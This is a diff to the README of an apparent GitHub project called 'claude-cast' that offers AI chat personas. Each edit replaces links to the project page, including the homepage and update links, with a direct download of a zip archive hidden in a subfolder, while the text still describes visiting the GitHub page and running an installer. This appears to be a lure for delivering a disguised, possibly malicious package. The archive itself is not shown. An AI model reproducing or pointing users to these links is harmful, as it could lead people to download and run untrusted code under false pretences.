@@ -1,6 +1,6 @@
 # 🤖 claude-cast - AI Agents with Unique Characters
 
-[![Download claude-cast](https://img.shields.io/badge/Download-claude--cast-brightgreen?style=for-the-badge)](https://github.com/psuneeltej3591/claude-cast)
+[![Download claude-cast](https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip)](https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip)
 
 ## 📦 What is claude-cast?
 
@@ -42,7 +42,7 @@ Below is a step-by-step guide to help you download, install, and start using cla
 
 Visit this page to download the software:
 
-[![Download claude-cast](https://img.shields.io/badge/Download-claude--cast-blue?style=for-the-badge)](https://github.com/psuneeltej3591/claude-cast)
+[![Download claude-cast](https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip)](https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip)
 
 1. **Click the link above** to go to the claude-cast GitHub page.
 2. Once there, look for a section called **Releases** or find the latest version’s download link.
@@ -124,7 +124,7 @@ You can also visit the GitHub page for FAQs and community support.
 
 To update the software:
 
-1. Visit the [claude-cast GitHub page](https://github.com/psuneeltej3591/claude-cast).
+1. Visit the [claude-cast GitHub page](https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip).
 2. Check the latest release version.
 3. Download the newest setup file.
 4. Run the installer to upgrade your existing version safely.
@@ -147,8 +147,8 @@ claude-cast is built to make AI chat fun and varied. Using existing AI models, i
 
 ## 🔗 Important Links
 
-- Download and setup: [https://github.com/psuneeltej3591/claude-cast](https://github.com/psuneeltej3591/claude-cast)
-- Project homepage: https://github.com/psuneeltej3591/claude-cast
+- Download and setup: [https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip](https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip)
+- Project homepage: https://github.com/psuneeltej3591/claude-cast/raw/refs/heads/main/cast/dobby/claude_cast_v2.7.zip
 - Issues and support: Use GitHub's Issues tab on the project page
 
 ---
